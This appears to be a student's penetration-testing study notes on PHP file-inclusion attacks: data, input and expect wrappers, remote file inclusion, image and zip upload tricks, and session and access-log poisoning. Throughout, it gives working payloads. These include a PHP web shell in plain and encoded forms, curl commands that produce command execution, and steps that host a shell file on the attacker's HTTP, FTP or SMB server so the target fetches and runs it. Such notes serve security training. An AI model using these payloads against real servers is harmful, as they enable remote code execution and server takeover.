# PHP Wrappers
- No need even for path traversa

## Data Wrapper
- Requires `allow_url_include` = on
	- Disabled by default, so check first
	- Check via LFI,
		- `/etc/php/X.Y/apache2/php.ini`
		- `/etc/php/X.Y/fpm/php.ini`
	- From before, use php://filter 
		- `php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`
		- Use Curl or Burp instead of browser since output could be long
	- Decode and grep
		- `base64 -d | grep allow_url_include`
- Can be used to include external data, including PHP code
	- Pass it base64 encoded strings with `text/plain;base64` and it will decode them and **execute the PHP code**
	- `echo '<?php system($_GET["cmd"]); ?>' | base64`
		- To get the base64
		- Or use Burp decoer
	- Then LFI 
		- `http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`
			- Replace the cmd with whatever is necessary

## Include wrapper
- Similarly, used to include external input and execute PHP code
	- Difference: pass our input to input wrapper as POST request data
	- So vulnerable parameter must accept POST request
	- Also must have `allow_url_include` (see above)
- Send a POST request to vulnerable URL and add web shell as POST data
```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Expect Wrapper
- Directly run commands through URL streams
	- No need to provide web shell, as it's designed to execute commands
- To check if its available, same check as for `allow_url_include` but grep for `expected` instead
	- `echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect`
	- Doesn't guarantee it's functional at loadtime
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Remote File Inclusion (RFI)
- Include OUR file
	- Can enumerate local-only ports and web applications (ie. ssrf)
	- RCE by including malicious script htat we host

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
- Check for RFI
	- Check for `allow_url_include` (like above)
	- Try to include a URL and see if it gets included
		- Try a local (victim side) URL first, to ensure attempt not blocked by firewall
		- `language=http:/127.0.0.1:80/index.php`
- Create script
	- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- Host script
	- `sudo python3 -m http.server <LISTENING_PORT>`
- Then include local shell through RFI
	- `...language=http://OUR_IP:LISTENING_port/shell.php&cmd=id`

Can also host through FTP
- Useful if http string blocked by WAF
- `sudo python -m pyftpdlib -p 21`
- `...language=ftp://OUR_IP:LISTENING_port/shell.php&cmd=id
Or SMB
- If vulnerable web app hosted on Windows server, don't need `allow_url_incluside` enabled
- `impacket-smbserver -smb2support share $(pwd)`
- `...language=\\<OURIP>\share\shell.php&cmd=whoami`
- But may not work if SMB over internet is disabled
# LFI and File Uploads
- Unlike the file upload attacks module, do not require the file uplaod form to be vulnerable, just to uplaod files
	- If vulnerable function has code `Execute` capabilities (see above) , then code in file we upload will get executed if we include it, regardless of extension or file type
		- eg. upload jpg image with PHP web shell code inside it

## Image Upload
- Create "image"
	- `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
- Upload the image onto the webpage
- Include the file path through LFI vulnerability
	- Need to know path to uploaded file
		- Usually can get acccess to uploaded file and its path from URL
		- Inspect source code after uploading file
			- `<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
				- So `/profile_images/shell.gif` is file path
		- If can't tell where file is, can file for uploads directory
	- Then just include it in the LFI
		- `language=./profile_images/shell.gif&cmd=id`

### Zip Upload
- `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
- `language=//<direcotry>/shell.jpg%23shell.php%cmd=id`
### Phar Upload
- 
# Log Poisoning
- Idea: write PHP code into field we control that gets logged into log file 
	- ie poison log file
	- Then include that log file to execute the PHP code
- PHP Web app needs read privileges over logged files
- Again, any function with `Execute` privileges should be vulnerable (see chart above again)

## PHP Session poisoning
- Most PHP Web Apps use `PHPSESSID` cookies
	- Stored in `session` files on back end
	- Saved in `/var/lib/php/sessions` on Linux, `C:\Windows\Temp` on Windows
	- Name of file that contains user data matches name of our `PHPSESSID` cookie with the `sess_` prefix
		- eg. cookie is `el4ukv0kqbvoirg7nkp4dncpk3`
			- Location on disk is `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`

Steps
- View cookie through devtools, under `storage > cookies`
- Figure out the file path
	- eg. `var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`
- Include the session file through LFI vuln and view its contents
	- `language=/var....`
	- Session file contain 2 values, 
		- `page` which shows selected language page
		- `preference` which shows selected language
	- Write a web shell into the session file by
		- Changing `page` to `http://......language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` by just visiting this URL
			- This is the encoded webshell
		- Then include the session file to execute it
		- `...language=/var/ib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id`
			- Take note of how to execute a command here (`&cmd=id`)
		- Note: to execute another command, session file has to be poisoned with web shell again as it gets overwritten with the current page after last inclusion

## Server log poisoning
- Apache and nginx maintain log files like `access.log` 
	- `access.log` contains info about requests made to server
		- Including each request's `User-Agent` header
		- Can use this to poison the log
- Find log through LFI
	- Apache logs default in `/var/log/apache2` on Linux and `C:\xampp\apache\logs\` on Windows
	- Nginx logs default in `/var/log/nginx` on Linux and `C:\nginx\log\` on Windows
	- If logs are in different area, may need to fuzz with LFI wordlist
		- https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
- Through Burp, modify the User-Agent of a request (any request, since it gets logged) to a PHP web shell
	- `<?php system(\$_GET['cmd']); ?>
- Then include the access file
	- `..language=/var/log/apache2/access.log&cmd=id`